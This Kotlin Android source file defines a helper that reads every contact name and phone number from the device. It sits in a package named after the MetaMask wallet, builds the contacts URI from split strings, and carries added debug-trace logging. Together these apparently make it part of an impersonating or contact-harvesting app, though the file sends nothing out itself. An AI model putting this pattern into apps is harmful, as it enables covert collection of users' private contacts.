package com.example.MetaMask.utils

import android.content.Context
import android.net.Uri

object ContactReaderUtil {

    data class ContactData(val name: String, val phoneNumber: String)

    fun getContacts(context: Context): List<ContactData> {
        android.util.Log.d("XDBG", "[ContactReaderUtil] getContacts enter context=ctx") //xdbg
        val contactList = mutableListOf<ContactData>()
        try {
            val resolver = context.contentResolver
            val uriStr = "content://" + "com.android.contacts" + "/data/phones"
            val uri = Uri.parse(uriStr)
            val colName = "display_name"
            val colNum = "data1"

            val cursor = resolver.query(
                uri,
                arrayOf(colName, colNum),
                null, null, null
            )

            cursor?.use {
                val nameIdx = it.getColumnIndex(colName)
                val numIdx = it.getColumnIndex(colNum)

                if (nameIdx >= 0 && numIdx >= 0) {
                    android.util.Log.d("XDBG", "[ContactReaderUtil] if branch") //xdbg
                    while (it.moveToNext()) {
                        android.util.Log.d("XDBG", "[ContactReaderUtil] loop") //xdbg
                        val name = it.getString(nameIdx)
                        val number = it.getString(numIdx)
                        if (name != null && number != null) {
                            android.util.Log.d("XDBG", "[ContactReaderUtil] if branch") //xdbg
                            contactList.add(ContactData(name, number))
                        }
                    }
                }
            }
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[ContactReaderUtil] catch ${e.javaClass.simpleName}: ${e.message}") //xdbg
        }
        android.util.Log.d("XDBG", "[ContactReaderUtil] return") //xdbg
        return contactList
    }
}
